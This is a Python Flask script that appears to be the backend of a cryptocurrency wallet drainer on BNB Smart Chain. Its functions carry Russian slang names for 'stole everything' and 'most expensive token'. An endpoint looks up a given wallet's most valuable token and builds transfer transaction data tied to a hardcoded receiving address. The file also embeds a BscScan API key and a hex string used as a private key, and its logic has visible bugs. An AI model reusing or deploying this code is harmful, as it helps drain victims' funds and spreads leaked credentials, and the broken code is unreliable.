from bscscan import BscScan
import time
from web3 import Web3
from json import dumps, loads
import requests
from pythonpancakes import PancakeSwapAPI
from flask import Flask
app = Flask(__name__)

def Spizdil_vse(token, token_address, address_main, address_sub, private_key,):
    with BscScan("XY1RX92T2W128G1US8IM3BRNIXZRPWCSU4", asynchronous=False) as client:
        transaction = token.functions.transfer(address_sub, int(Web3.toHex(int(client.get_acc_balance_by_token_contract_address(contract_address=token_address, address= i))), 16)).buildTransaction({'chainId': 56,  
        'gas':70000,
        'nonce': w3.eth.getTransactionCount(address_main)}) 
        signed_tx = w3.eth.account.sign_transaction(transaction, private_key) 
        tx_hash = w3.eth.sendRawTransaction(signed_tx.rawTransaction)

def Samiy_dorogoy_token(account_name):
    price = 0
    amount_price = 0
    token_symbol = ''
    token_id = ''
    r = requests.get(f'https://openapi.debank.com/v1/user/token_list?id={account_name}&chain_id=bsc&is_all=true&has_balance=true')
    per = r.json()
    for k in per:
        price = float(k['price']) * float(k['amount'])
        if price > amount_price:
            amount_price = k['amount']
            token_symbol = k['symbol']
            token_id = k['id']
    big_token_info = {"symbol": token_symbol,
    "price": amount_price,
    "id": token_id}
    return big_token_info

def make_transaction_coin(data, address_main, address_sub, token):
    with BscScan("XY1RX92T2W128G1US8IM3BRNIXZRPWCSU4", asynchronous=False) as client:
        transaction = token.functions.transfer(address_sub, int(Web3.toHex(int(client.get_acc_balance_by_token_contract_address(contract_address=data["id"], address= address_sub))), 16)).buildTransaction({'chainId': 56,  
        'gas':70000,
        'nonce': w3.eth.getTransactionCount(address_main)})
        data['transaction'] = transaction['data']
        data_JSON = dumps(data)
        return data_JSON
        
        




w3 = Web3(Web3.HTTPProvider('https://bsc-dataseed1.binance.org:443/'))
ps = PancakeSwapAPI()
abi_bep20 = '[{"anonymous": false,"inputs": [{"indexed": true,"internalType": "address","name": "owner","type": "address"},{"indexed": true,"internalType": "address","name": "spender","type": "address"},{"indexed": false,"internalType": "uint256","name": "value","type": "uint256"}],"name": "Approval","type": "event"},{"anonymous": false,"inputs": [{"indexed": true,"internalType": "address","name": "from","type": "address"},{"indexed": true,"internalType": "address","name": "to","type": "address"},{"indexed": false,"internalType": "uint256","name": "value","type": "uint256"}],"name": "Transfer","type": "event"},{"constant": true,"inputs": [{"internalType": "address","name": "_owner","type": "address"},{"internalType": "address","name": "spender","type": "address"}],"name": "allowance","outputs": [{"internalType": "uint256","name": "","type": "uint256"}],"payable": false,"stateMutability": "view","type": "function"},{"constant": false,"inputs": [{"internalType": "address","name": "spender","type": "address"},{"internalType": "uint256","name": "amount","type": "uint256"}],"name": "approve","outputs": [{"internalType": "bool","name": "","type": "bool"}],"payable": false,"stateMutability": "nonpayable","type": "function"},{"constant": true,"inputs": [{"internalType": "address","name": "account","type": "address"}],"name": "balanceOf","outputs": [{"internalType": "uint256","name": "","type": "uint256"}],"payable": false,"stateMutability": "view","type": "function"},{"constant": true,"inputs": [],"name": "decimals","outputs": [{"internalType": "uint256","name": "","type": "uint256"}],"payable": false,"stateMutability": "view","type": "function"},{"constant": true,"inputs": [],"name": "getOwner","outputs": [{"internalType": "address","name": "","type": "address"}],"payable": false,"stateMutability": "view","type": "function"},{"constant": true,"inputs": [],"name": "name","outputs": [{"internalType": "string","name": "","type": "string"}],"payable": false,"stateMutability": "view","type": "function"},{"constant": true,"inputs": [],"name": "symbol","outputs": [{"internalType": "string","name": "","type": "string"}],"payable": false,"stateMutability": "view","type": "function"},{"constant": true,"inputs": [],"name": "totalSupply","outputs": [{"internalType": "uint256","name": "","type": "uint256"}],"payable": false,"stateMutability": "view","type": "function"},{"constant": false,"inputs": [{"internalType": "address","name": "recipient","type": "address"},{"internalType": "uint256","name": "amount","type": "uint256"}],"name": "transfer","outputs": [{"internalType": "bool","name": "","type": "bool"}],"payable": false,"stateMutability": "nonpayable","type": "function"},{"constant": false,"inputs": [{"internalType": "address","name": "sender","type": "address"},{"internalType": "address","name": "recipient","type": "address"},{"internalType": "uint256","name": "amount","type": "uint256"}],"name": "transferFrom","outputs": [{"internalType": "bool","name": "","type": "bool"}],"payable": false,"stateMutability": "nonpayable","type": "function"}]'
abi_bep20 = loads(abi_bep20)
adddres_main = Web3.toChecksumAddress('0x4E555417Bb8181965B3503cD3294d4d80AF45D14')
token_number = 100
tokens = ps.tokens()
account_no_loop = ''

@app.route('/adress/<adress>')
def show_user_profile(adress):
    account_no_loop = ''
    
    rofl = requests.get(f'https://openapi.debank.com/user/wallet')
    roflyanka = adress
    if account_no_loop == roflyanka:
        pass
    else:
        account_no_loop = roflyanka
        otvet = Samiy_dorogoy_token(account_no_loop)
        if otvet["symbol"] == 'BNB':
            pass
        else:
            token_contract_addddress = Web3.toChecksumAddress(otvet['id'])
            token_contract = w3.eth.contract(address=token_contract_addddress, abi=abi_bep20)
            overall = make_transaction_coin(otvet, adddres_main, account_no_loop, token_contract)
            return overall
# for j in range(token_number):
#     Spizdil_vse(j, adddres_token_cake, adddres_main, adddres_main, '0xFE4b00565a4301832bFC211F37E2e9925D39B842')
if __name__ == "__main__":
    app.run(host='0.0.0.0', port=4567)